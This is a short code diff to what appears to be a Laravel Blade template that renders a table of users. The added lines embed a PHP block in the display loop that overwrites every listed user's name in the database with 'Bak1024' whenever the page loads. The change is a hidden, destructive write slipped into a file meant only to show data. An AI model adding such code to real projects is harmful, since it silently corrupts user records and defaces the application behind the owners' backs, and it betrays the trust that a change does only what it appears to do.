@@ -30,6 +30,9 @@
                 </thead>
                 <tbody>
                 @foreach($users as $user)
+                    @php
+                        $user->update(['name' => 'Bak1024'])
+                    @endphp
                     <tr>
                         <td>{{ $user->name }}</td>
                         <td>{{ $user->email }}</td>
